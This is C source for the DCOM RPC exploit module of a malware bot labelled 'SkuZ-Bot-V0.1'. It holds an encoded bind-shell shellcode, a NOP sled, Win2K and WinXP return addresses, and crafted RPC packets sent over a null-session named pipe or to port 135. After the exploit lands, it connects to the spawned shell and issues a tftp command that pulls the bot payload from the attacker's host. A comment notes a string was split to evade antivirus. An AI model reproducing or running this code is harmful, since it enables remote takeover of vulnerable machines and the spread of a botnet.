/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 
#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#ifndef NO_DCOM

char shellcode_start[]=
	"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00"
	"\x46\x00\x58\x00"
	"\xff\xff\xff\xff"	/* return address */
	"\xcc\xe0\xfd\x7f"	/* primary thread data block */
	"\xcc\xe0\xfd\x7f";	/* primary thread data block */

char nops[] =
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90";

char bindstr[] =
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00"
	"\xa0\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";

char request4[] =
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x20\x00\x00\x00\x30\x00\x2D\x00"
	"\x00\x00\x00\x00\x88\x2A\x0C\x00\x02\x00\x00\x00\x01\x00\x00\x00"
	"\x28\x8C\x0C\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";

/*	\E$\938479272375092753287.xls
	\F$\993847593892837527687.bat
	\S$\267364889234572836487.cmd
	\Y$\128736872350982734872.zip
	\V$\287348927347869928738.rar
	\W$\348579872387469762349.tmp
	\X$\349587230872349876934.bla
	\U$\349879876098209889734.h4x */

char request3[] = // \C$\123456111111111111111.doc
	"\x5C\x00\x43\x00\x24\x00\x5C\x00\x31\x00\x32\x00\x33\x00\x34\x00"
	"\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00";

char request2[] =
	"\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x5C\x00\x5C\x00";

char request1[] =
	"\x05\x00\x00\x03\x10\x00\x00\x00\xE8\x03\x00\x00\xE5\x00\x00\x00"
	"\xD0\x03\x00\x00\x01\x00\x04\x00\x05\x00\x06\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x32\x24\x58\xFD\xCC\x45\x64\x49\xB0\x70\xDD\xAE"
	"\x74\x2C\x96\xD2\x60\x5E\x0D\x00\x01\x00\x00\x00\x00\x00\x00\x00"
	"\x70\x5E\x0D\x00\x02\x00\x00\x00\x7C\x5E\x0D\x00\x00\x00\x00\x00"
	"\x10\x00\x00\x00\x80\x96\xF1\xF1\x2A\x4D\xCE\x11\xA6\x6A\x00\x20"
	"\xAF\x6E\x72\xF4\x0C\x00\x00\x00\x4D\x41\x52\x42\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x0D\xF0\xAD\xBA\x00\x00\x00\x00\xA8\xF4\x0B\x00"
	"\x60\x03\x00\x00\x60\x03\x00\x00\x4D\x45\x4F\x57\x04\x00\x00\x00"
	"\xA2\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x38\x03\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x30\x03\x00\x00\x28\x03\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\xC8\x00\x00\x00\x4D\x45\x4F\x57"
	"\x28\x03\x00\x00\xD8\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
	"\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\xC4\x28\xCD\x00\x64\x29\xCD\x00\x00\x00\x00\x00"
	"\x07\x00\x00\x00\xB9\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAB\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA5\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA6\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA4\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAD\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAA\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00\x00\x00\x58\x00\x00\x00"
	"\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00\x00\x00\x78\x00\x00\x00"
	"\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x50\x00\x00\x00\x4F\xB6\x88\x20\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09\x02\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x10\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x19\x0C\x00"
	"\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00\x00\x00\x70\xD8\x98\x93"
	"\x98\x4F\xD2\x11\xA9\x3D\xBE\x57\xB2\x00\x00\x00\x32\x00\x31\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x80\x00\x00\x00\x0D\xF0\xAD\xBA"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00\x00\x00\x60\x00\x00\x00"
	"\x4D\x45\x4F\x57\x04\x00\x00\x00\xC0\x01\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x3B\x03\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x00\x00\x00"
	"\x01\x00\x01\x00\x81\xC5\x17\x03\x80\x0E\xE9\x4A\x99\x99\xF1\x8A"
	"\x50\x6F\x7A\x85\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x30\x00\x00\x00\x78\x00\x6E\x00"
	"\x00\x00\x00\x00\xD8\xDA\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x20\x2F\x0C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
	"\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00\x58\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x10\x00\x00\x00\x30\x00\x2E\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x68\x00\x00\x00\x0E\x00\xFF\xFF"
	"\x68\x8B\x0B\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char bindshell[] =
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
	"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
	"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
	"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
	"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
	"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
	"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
	"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
	"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
	"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
	"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
	"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
	"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
	"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
	"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
	"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
	"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
	"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
	"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
	"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
	"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
	"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
	"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
	"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
	"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";
static int bindshellsize=sizeof(bindshell);

unsigned long call_ebx_offsets[] = {
	0x010016C6,		// Win2K
	0x0100139d      // WinXP
};

bool DShell(EXINFO exinfo) {
		
		int len;
		char recvbuf[1024];
        char newip[] = "209.169.123.150";
		SOCKET sockfd;
		SOCKADDR_IN shell_addr;
		memset(&shell_addr, 0, sizeof(shell_addr));
		

		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip);
		shell_addr.sin_port = fhtons(bindport);;

		if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
			return false;
		if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
			return false;
		
		char mkdir_buff[400];

		len = frecv(sockfd, recvbuf, 1024, 0);
		#ifndef NO_TFTPD
		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"tftp -i %s get %s\r\n",
		GetIP( exinfo.sock ),filename, filename);
		#endif
		/*#ifndef NO_FTPD
		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &%s\r\n", GetIP(exinfo.sock), FTP_PORT, filename, filename);	
		#endif*/
		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		
		Sleep(500);
		_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);


		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		len = frecv(sockfd, recvbuf, 1024, 0);

		fclosesocket(sockfd);
		return true;

}

BOOL ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr)
{	
	WCHAR Ipc[] = L"\\IPC$", Resource[280] = L"\\\\";
	TCHAR szServer[280] = TEXT("");

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);

	nr->dwType       = RESOURCETYPE_ANY;
	nr->lpLocalName  = NULL;
	nr->lpRemoteName = Resource;
	nr->lpProvider   = NULL;
	
	DWORD result = fWNetAddConnection2W(nr, L"", L"", 0);

	if (result == 5 || result == 1219) 
		result = fWNetAddConnection2W(nr, NULL, NULL, 0);
	if (result == 5 || result == 1219) 
		return FALSE;

	return TRUE;
}

BOOL CloseNullSession(const char *remote_host)
{	
	WCHAR Ipc[] = L"\\IPC$", Resource[280] = L"\\\\";
	TCHAR szServer[280] = TEXT("");

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource, (wchar_t*)szServer);
	wcscat(Resource, Ipc);

	while (fWNetCancelConnection2W(Resource, 0, FALSE) != NO_ERROR) 
		Sleep(2000);

	return TRUE;
}

int dbindsize=405;

char *CreateDCOMRequestPacket(EXINFO exinfo, DWORD *RequestPacketSize, int TargetOS, BOOL NamedPipe)
{
	char *pTemp, szSCBuf[4096], szReqBuf[4096];//, szShellBuf[4096];
	int iShellSize = 0, iPos = 0, iSCSize = 0, iReqSize = 0, iNOPSize = sizeof(nops)-1;
	
	unsigned short port;
    port = fhtons(bindport)^(USHORT)0x9999;
    memcpy(&bindshell[176], &port, 2);

	iShellSize=dbindsize;//setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), URL, false, NULL);
	//iShellSize = GetRNS0TerminatedShellcode(szShellBuf, 4096, GetIP(exinfo.sock), filename);
	if (!iShellSize) 
		return 0;

	// build a buffer with the shellcode
	memcpy(szSCBuf+iPos,shellcode_start,sizeof(shellcode_start)-1);
	iPos += sizeof(shellcode_start)-1;
	
	memset(szSCBuf+iPos,'\x90',iNOPSize);
	iPos += iNOPSize;
	
	memcpy(szSCBuf+iPos,bindshell,iShellSize);
	iPos += iShellSize;
	
	iSCSize = iPos; iPos = 0;

	// prepend NOPs as long as shellcode doesn't fit RPC packet format
	while ((iSCSize % 16) != 12) {
		iNOPSize++;
		memcpy(szSCBuf+iPos,shellcode_start,sizeof(shellcode_start)-1);
		iPos += sizeof(shellcode_start)-1;
		
		memset(szSCBuf+iPos,'\x90',iNOPSize);
		iPos += iNOPSize;
		
		memcpy(szSCBuf+iPos,bindshell,iShellSize);
		iPos += iShellSize;
		
		iSCSize = iPos; iPos = 0;
	}

	// set the return address
	if (NamedPipe) {
		if (TargetOS == OS_WINXP || TargetOS == OS_UNKNOWN) 
			memcpy(szSCBuf+36, (char *)&call_ebx_offsets[1], 4);
		else 
			memcpy(szSCBuf+36, (char *)&call_ebx_offsets[0], 4);
	} else {
		if (TargetOS == OS_WINXP) 
			memcpy(szSCBuf+36, (char*)&call_ebx_offsets[1], 4);
		else 
			memcpy(szSCBuf+36, (char*)&call_ebx_offsets[0], 4);
	}

	// build the request
	memcpy(szReqBuf+iPos, request1, sizeof(request1)-1); iPos += sizeof(request1)-1;
	memcpy(szReqBuf+iPos, request2, sizeof(request2)-1); iPos += sizeof(request2)-1;
	memcpy(szReqBuf+iPos, szSCBuf,  iSCSize           ); iPos += iSCSize;
	memcpy(szReqBuf+iPos, request3, sizeof(request3)-1); iPos += sizeof(request3)-1;
	memcpy(szReqBuf+iPos, request4, sizeof(request4)-1); iPos += sizeof(request4)-1;
	iReqSize = iPos;

	// fill the request with the right sizes
	pTemp = szReqBuf + (sizeof(request1)-1);
	*(unsigned long*)(pTemp)     = *(unsigned long*)(pTemp)     + iSCSize / 2;
	*(unsigned long*)(pTemp+8)   = *(unsigned long*)(pTemp+8)   + iSCSize / 2; pTemp = szReqBuf;
	*(unsigned long*)(pTemp+8)   = *(unsigned long*)(pTemp+8)   + iSCSize - 12;
	*(unsigned long*)(pTemp+16)  = *(unsigned long*)(pTemp+16)  + iSCSize - 12;
	*(unsigned long*)(pTemp+128) = *(unsigned long*)(pTemp+128) + iSCSize - 12;
	*(unsigned long*)(pTemp+132) = *(unsigned long*)(pTemp+132) + iSCSize - 12;
	*(unsigned long*)(pTemp+180) = *(unsigned long*)(pTemp+180) + iSCSize - 12;
	*(unsigned long*)(pTemp+184) = *(unsigned long*)(pTemp+184) + iSCSize - 12;
	*(unsigned long*)(pTemp+208) = *(unsigned long*)(pTemp+208) + iSCSize - 12;
	*(unsigned long*)(pTemp+396) = *(unsigned long*)(pTemp+396) + iSCSize - 12;

	char *Shellcode = (char *)malloc(iReqSize+1);
	ZeroMemory(Shellcode,iReqSize+1);
	memcpy(Shellcode, szReqBuf, iReqSize);
	*RequestPacketSize = iReqSize;

	return Shellcode;
}

BOOL dcom(EXINFO exinfo)
{
	if (exinfo.port == 445) {
		NETRESOURCEW nr;

		if (!ConnectViaNullSession(exinfo.ip, &nr)) 
			return FALSE;
		else {
			char szPipePath[MAX_PATH];
			//sprintf(szPipePath, "\\\\%s\\pipe\\epmapper", exinfo.ip);//sorry kaspersky
			sprintf(szPipePath, "\\\\%s\\", exinfo.ip);
			strcat(szPipePath,"pipe\\epmapper");
			HANDLE hFile = CreateFile(szPipePath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile == INVALID_HANDLE_VALUE) {
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			int TargetOS = FpHost(exinfo.ip, FP_PORT5K);
			//int TargetOS=FpHost(exinfo.ip,FP_NP);
			//if (TargetOS==OS_UNKNOWN) 
				//TargetOS=FpHost(exinfo.ip,FP_SMB);
			//if (TargetOS == OS_WINNT) 
				//return FALSE;

			// get shellcode
			DWORD reqbufsize;
			char *reqbuf = CreateDCOMRequestPacket(exinfo, &reqbufsize, TargetOS, TRUE);
			if (!reqbuf) {
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			unsigned long lWritten;
			char *szInBuf = (char *)malloc(100000);
			ZeroMemory(szInBuf,100000);

			// send the bind string
			DWORD dwRead;
			TransactNamedPipe(hFile, bindstr, sizeof(bindstr)-1, szInBuf, 10000, &dwRead, NULL);
			if (szInBuf[2] != 0x0C) {
				free(szInBuf); 
				free(reqbuf);
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			// send the evil request
			if (!WriteFile(hFile, reqbuf, reqbufsize, &lWritten, 0)) {
				free(szInBuf); 
				free(reqbuf);
				CloseHandle(hFile);
				CloseNullSession(exinfo.ip);
				return FALSE;
			}

			free(reqbuf); 
			free(szInBuf);
			CloseHandle(hFile);
			CloseNullSession(exinfo.ip);
		}

	} else { // port 135 and others

		int TargetOS=FpHost(exinfo.ip,FP_RPC);
		//if (TargetOS==OS_UNKNOWN)
			//TargetOS=FpHost(exinfo.ip,FP_SMB);
		//if (TargetOS == OS_WINNT) 
			//return FALSE;
		
		// get a funky fresh socket
		SOCKET sSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (sSocket == SOCKET_ERROR) 
			return FALSE;

		// fill in sockaddr and resolve the host
		SOCKADDR_IN ssin; 
		ZeroMemory(&ssin,sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(exinfo.port);
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

		// get shellcode
		DWORD reqbufsize;
		char *reqbuf = CreateDCOMRequestPacket(exinfo, &reqbufsize, TargetOS, FALSE);
		if (!reqbuf) {
			fclosesocket(sSocket);
			return FALSE;
		}

		// connect to the server
		int iErr = fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
		if (iErr == -1) { // connect failed, exit
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		// send the bind string
		if (fsend(sSocket, bindstr, sizeof(bindstr)-1, 0) == SOCKET_ERROR) {
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		// read reply
		char recvbuf[4096];
		frecv(sSocket, recvbuf, 4096, 0);
		// Send the evil request
		if (fsend(sSocket, reqbuf, reqbufsize, 0) == SOCKET_ERROR) {
			free(reqbuf);
			fclosesocket(sSocket);
			return FALSE;
		}

		free(reqbuf);
		// Close the socket
		fclosesocket(sSocket);		
	}

	Sleep(2000);
	
	if (DShell(exinfo))
	{
		exploit[ exinfo.exploit ].stats++;
	}

	return TRUE;
}

#endif

/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 